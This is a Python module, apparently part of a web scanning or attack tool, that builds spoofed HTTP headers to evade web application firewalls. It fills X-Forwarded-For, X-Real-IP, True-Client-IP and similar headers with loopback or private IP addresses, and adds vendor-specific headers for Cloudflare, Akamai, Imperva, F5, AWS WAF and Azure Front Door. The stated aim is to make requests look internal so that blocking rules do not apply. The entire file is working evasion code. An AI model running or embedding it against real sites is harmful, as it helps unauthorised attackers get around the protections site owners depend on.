"""Bypass header injection for WAF evasion.

Many WAFs trust certain headers (X-Forwarded-For, True-Client-IP, etc.)
and apply different rule sets to requests that appear to come from
internal/trusted IPs. This module builds a set of spoofed headers
that can reduce or eliminate blocking.
"""
from __future__ import annotations
import random

SPOOF_IPS: list[str] = [
    "127.0.0.1",
    "10.0.0.1",
    "10.0.0.2",
    "172.16.0.1",
    "172.16.0.2",
    "192.168.1.1",
    "192.168.0.1",
    "192.168.100.1",
    "localhost",
    "127.0.0.2",
    "10.10.10.10",
    "172.31.0.1",
]

_WAF_EXTRA_HEADERS: dict[str, dict[str, str]] = {
    "cloudflare": {
        "CF-Connecting-IP": "",           # filled with spoof_ip at call time
        "CF-IPCountry": "US",
    },
    "akamai": {
        "Akamai-Origin-Hop": "1",
        "X-Akamai-Staging": "ESSL",
    },
    "imperva": {
        "X-Forwarded-Proto": "https",
        "Incapsula-Client": "1",
    },
    "f5_bigip": {
        "X-WA-Info": "0",
    },
    "aws_waf": {
        "X-Amzn-Trace-Id": "Root=1-00000000-000000000000000000000000",
    },
    "azure_frontdoor": {
        "X-Azure-ClientIP": "",           # filled with spoof_ip at call time
        "X-Azure-SocketIP": "",
    },
}


def build_bypass_headers(
    waf_type: str | None,
    spoof_ip: str | None = None,
) -> dict[str, str]:
    """Build a dict of HTTP headers designed to bypass WAF IP-based rules.

    Args:
        waf_type: WAF type string from WAFProfiler (e.g. "cloudflare", None)
        spoof_ip: IP to inject into X-Forwarded-For etc. If None, a random
                  private IP from SPOOF_IPS is selected.

    Returns:
        Header dict ready to merge into an httpx request's headers.
    """
    ip = spoof_ip if spoof_ip is not None else random.choice(SPOOF_IPS)

    headers: dict[str, str] = {
        "X-Forwarded-For": ip,
        "X-Real-IP": ip,
        "True-Client-IP": ip,
        "X-Originating-IP": ip,
        "X-Forwarded-Host": "localhost",
        "X-Remote-IP": ip,
        "X-Client-IP": ip,
    }

    waf_key = (waf_type or "").lower()
    if waf_key in _WAF_EXTRA_HEADERS:
        for k, v in _WAF_EXTRA_HEADERS[waf_key].items():
            headers[k] = v if v else ip

    return headers
